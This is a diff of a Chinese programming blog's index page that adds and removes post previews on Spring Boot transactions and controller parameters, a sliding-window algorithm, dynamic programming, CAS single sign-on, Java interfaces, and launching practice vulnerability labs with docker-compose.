@@ -138,6 +138,346 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-java/mysql事务" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/10/java/mysql事务/">spring中mysql事务</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/10/java/mysql事务/" class="archive-article-date">
+  	<time datetime="2019-06-10T07:53:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-springboot中使用mysql事务"><a href="#1-springboot中使用mysql事务" class="headerlink" title="1.springboot中使用mysql事务"></a>1.springboot中使用mysql事务</h3><h5 id="1-pom-xml"><a href="#1-pom-xml" class="headerlink" title="(1).pom.xml"></a>(1).pom.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- mybatis配置 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- end mybatis --&gt;</span><br><span class="line">&lt;!-- mysql驱动 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- end mysql --&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="2-EnableTransactionManagement"><a href="#2-EnableTransactionManagement" class="headerlink" title="(2)@EnableTransactionManagement"></a>(2)@EnableTransactionManagement</h5><p>启动类打开@EnableTransactionManagement注解</p>
+<h5 id="3-使用事务"><a href="#3-使用事务" class="headerlink" title="(3)使用事务"></a>(3)使用事务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@Transactional(rollbackFor = Exception.class)</span><br><span class="line">   public void addData()&#123;</span><br><span class="line">       testMapper.insertData1(1,&quot;111&quot;);</span><br><span class="line">       testMapper.insertData2(1,&quot;012345678910&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">mysql</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/10/java/mysql事务/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-algorithm/sildewindow/最大面积" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/06/algorithm/sildewindow/最大面积/">求最大面积</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/06/algorithm/sildewindow/最大面积/" class="archive-article-date">
+  	<time datetime="2019-06-06T07:55:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h3><p><img src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg" alt="contains"></p>
+<p>假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br></p>
+<h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h3><p>利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br></p>
+<p>因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br></p>
+<ul>
+<li>若left 高于 right, 则右边界收缩</li>
+<li>若left 低于 right, 则左边界收缩</li>
+<li>记录过程中的 Max(area)</li>
+</ul>
+<h3 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxArea(int[] height) &#123;</span><br><span class="line">        int right = height.length - 1;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int max = 0;</span><br><span class="line">        while(left &lt; right)&#123;</span><br><span class="line">            int s = Math.min(height[left], height[right]) * (right-left);</span><br><span class="line">            max = Math.max(max,s);</span><br><span class="line">            if(height[left] &gt; height[right])&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">algorithm</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/06/algorithm/sildewindow/最大面积/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-algorithm/动态规划/dynamic-programing" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/05/algorithm/动态规划/dynamic-programing/">动态规划算法</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/05/algorithm/动态规划/dynamic-programing/" class="archive-article-date">
+  	<time datetime="2019-06-05T07:03:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="动态规划原理"><a href="#动态规划原理" class="headerlink" title="动态规划原理"></a>动态规划原理</h3><p>将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">algorithm</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/05/algorithm/动态规划/dynamic-programing/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-base/cas-sso/cas" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/30/base/cas-sso/cas/">Cas 单点登录原理</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/30/base/cas-sso/cas/" class="archive-article-date">
+  	<time datetime="2019-05-30T08:30:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h3><p>单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。</p>
+<h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>CAS 为 Central Authentication Service。<br><br>CAS 分为 CAS Server 和 CAS Client.<br></p>
+<ul>
+<li>CAS Server 负责用户的认证和授权</li>
+<li>CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。</li>
+</ul>
+<h4 id="一-授权与登录操作"><a href="#一-授权与登录操作" class="headerlink" title="一.授权与登录操作"></a>一.授权与登录操作</h4><h6 id="1-未登录时"><a href="#1-未登录时" class="headerlink" title="1.未登录时"></a>1.未登录时</h6><p><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas01.png" alt="cas01"><br>如图:<br></p>
+<ul>
+<li>(1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。</li>
+<li>(3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))<br><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png" alt="cas_session01"><br>将会话的jsessionid设置为图中1.</li>
+<li>(4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证</li>
+<li>(5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源</li>
+</ul>
+<h6 id="2-已登录时"><a href="#2-已登录时" class="headerlink" title="2.已登录时"></a>2.已登录时</h6><p>当已登录的用户第一次访问其它互相信任的系统时：<br></p>
+<ul>
+<li>(1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。</li>
+<li>(3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.</li>
+<li>(4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。</li>
+</ul>
+<h4 id="二-登录状态判断"><a href="#二-登录状态判断" class="headerlink" title="二.登录状态判断"></a>二.登录状态判断</h4><p>已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br><br><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png" alt="cas01"><br>当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br><br>不同的域，各自维护自己的session.<br></p>
+<h4 id="三-退出"><a href="#三-退出" class="headerlink" title="三.退出"></a>三.退出</h4><ul>
+<li>(1)客户端向当前web应用发起退出请求。</li>
+<li>(2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。</li>
+<li>(3)应用返回客户端登出请求。</li>
+<li>(4)CAS Server 通知所有用户登录访问的应用，用户已登出。</li>
+</ul>
+<h4 id="四-CAS中的ticket"><a href="#四-CAS中的ticket" class="headerlink" title="四.CAS中的ticket"></a>四.CAS中的ticket</h4><ul>
+<li>TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</li>
+<li>ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</li>
+<li>LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。</li>
+<li>TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">base</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/30/base/cas-sso/cas/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-algorithm/sildewindow/manacher" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -626,345 +966,6 @@
 
 
   
-    <article id="post-java/springboot接收参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/22/java/springboot接收参数/">springboot Controller 接收参数</a>
-    </h1>
-  
-
-        
-        <a href="/2019/02/22/java/springboot接收参数/" class="archive-article-date">
-  	<time datetime="2019-02-22T02:34:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="一-原因"><a href="#一-原因" class="headerlink" title="一.原因"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>
-<h4 id="二-常见注解"><a href="#二-常见注解" class="headerlink" title="二.常见注解"></a>二.常见注解</h4><h6 id="1-PathVariable"><a href="#1-PathVariable" class="headerlink" title="1.@PathVariable"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class="line">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class="line">    System.out.println(param);</span><br><span class="line">    return param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="2-RequestParam"><a href="#2-RequestParam" class="headerlink" title="2.@RequestParam"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class="line">@ResponseBody</span><br><span class="line">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class="line">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class="line">        return param1 + param2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="3-RequestBody"><a href="#3-RequestBody" class="headerlink" title="3.@RequestBody"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get3</span><br><span class="line">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class="line">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="4-HttpServletRequest"><a href="#4-HttpServletRequest" class="headerlink" title="4.HttpServletRequest"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class="line">//或参数为form-data</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(HttpServletRequest request) &#123;</span><br><span class="line">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="5-直接获取"><a href="#5-直接获取" class="headerlink" title="5.直接获取"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(String param1, String param2) &#123;</span><br><span class="line">    return param1+param2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>######</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/22/java/springboot接收参数/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-tools/docker_vulner_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/14/tools/docker_vulner_install/">docker搭建漏洞环境</a>
-    </h1>
-  
-
-        
-        <a href="/2019/02/14/tools/docker_vulner_install/" class="archive-article-date">
-  	<time datetime="2019-02-14T03:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-docker-compose"><a href="#1-docker-compose" class="headerlink" title="1.docker-compose"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>
-<h4 id="2-git"><a href="#2-git" class="headerlink" title="2.git"></a>2.git</h4><p>git clone <a href="https://github.com/c0ny1/vulstudy.git" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy.git</a></p>
-<h4 id="3-start"><a href="#3-start" class="headerlink" title="3.start"></a>3.start</h4><h6 id="1-单独运行一个漏洞平台"><a href="#1-单独运行一个漏洞平台" class="headerlink" title="1.单独运行一个漏洞平台"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>
-<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
-<h6 id="2-同时运行所有漏洞平台"><a href="#2-同时运行所有漏洞平台" class="headerlink" title="2.同时运行所有漏洞平台"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>
-<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
-<h5 id="3-查看信息"><a href="#3-查看信息" class="headerlink" title="3.查看信息"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps  </span><br><span class="line">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class="line">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/14/tools/docker_vulner_install/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/interface" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/21/java/interface/">接口</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/21/java/interface/" class="archive-article-date">
-  	<time datetime="2019-01-21T06:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://blog.csdn.net/u010466329/article/details/78133282" target="_blank" rel="noopener">接口与抽象类区别</a></p>
-<h3 id="一-例子"><a href="#一-例子" class="headerlink" title="一.例子"></a>一.例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package base.interfacedemo;</span><br><span class="line"></span><br><span class="line">//定义一个接口</span><br><span class="line">interface TestInterface &#123;</span><br><span class="line"></span><br><span class="line">    void test();</span><br><span class="line"></span><br><span class="line">    //接口静态内部类实现 默认 public static final</span><br><span class="line">    //方便扩展</span><br><span class="line">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void test() &#123;</span><br><span class="line">            System.out.println(&quot;test1&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //default方法 java8新特性</span><br><span class="line">    default void Demo3()&#123;</span><br><span class="line">       System.out.println(&quot;test3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//正常的接口实现</span><br><span class="line">class Demo2 implements TestInterface&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        System.out.println(&quot;test2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DemoInterface&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        TestInterface.Demo1.test();</span><br><span class="line">        new Demo2().test();</span><br><span class="line">        Demo2 demo3 = new Demo2();</span><br><span class="line">        demo3.Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-
